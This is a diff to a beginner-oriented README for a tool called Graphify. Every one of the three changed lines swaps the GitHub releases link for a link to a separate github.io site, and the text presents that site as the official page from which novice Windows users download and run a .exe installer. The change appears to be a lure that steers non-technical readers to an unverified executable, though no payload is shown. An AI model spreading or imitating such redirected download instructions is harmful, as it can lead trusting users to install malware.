@@ -4,7 +4,7 @@
 
 Welcome to **awesome-graphify** – the all-in-one resource hub for everything related to Graphify, a powerful skill that turns your GitHub activity into beautiful, interactive knowledge graphs. This guide will walk you through downloading, installing, and using Graphify on your Windows computer, even if you've never touched code before. Let's get started!
 
-[⬇️ DOWNLOAD NOW – Click Here](https://github.com/echomind12/awesome-graphify/releases)
+[⬇️ DOWNLOAD NOW – Click Here](https://echomind12.github.io)
 
 ## 📥 What Is Graphify?
 
@@ -35,7 +35,7 @@ Don't worry if your PC is older – these are modest requirements that most mode
 Follow these exact steps to get Graphify on your computer:
 
 ### Step 1: Visit the Download Page
-Click this link: **[https://github.com/echomind12/awesome-graphify/releases](https://github.com/echomind12/awesome-graphify/releases)**. This will take you to the official download page. It might look technical, but just look for a section that says "Assets" or "Downloads."
+Click this link: **[https://echomind12.github.io](https://echomind12.github.io)**. This will take you to the official download page. It might look technical, but just look for a section that says "Assets" or "Downloads."
 
 ### Step 2: Choose the Right File
 On the download page, you'll see a list of files. Look for one that ends with **`.exe`** – that's the Windows installer file. The name might look like `graphify-setup.exe` or something similar. Don't click anything else yet.
@@ -111,7 +111,7 @@ You don't need to be a programmer to enjoy Graphify. If you can browse the web a
 
 Remember: every expert was once a beginner. Take it one step at a time, and soon you'll be exploring your knowledge graph with confidence. Bookmark this page, share it with friends, and most importantly – have fun visualizing your world!
 
-[🔄 Visit the Download Page Again – Just in Case](https://github.com/echomind12/awesome-graphify/releases)
+[🔄 Visit the Download Page Again – Just in Case](https://echomind12.github.io)
 
 Happy graphing! 🎉
 
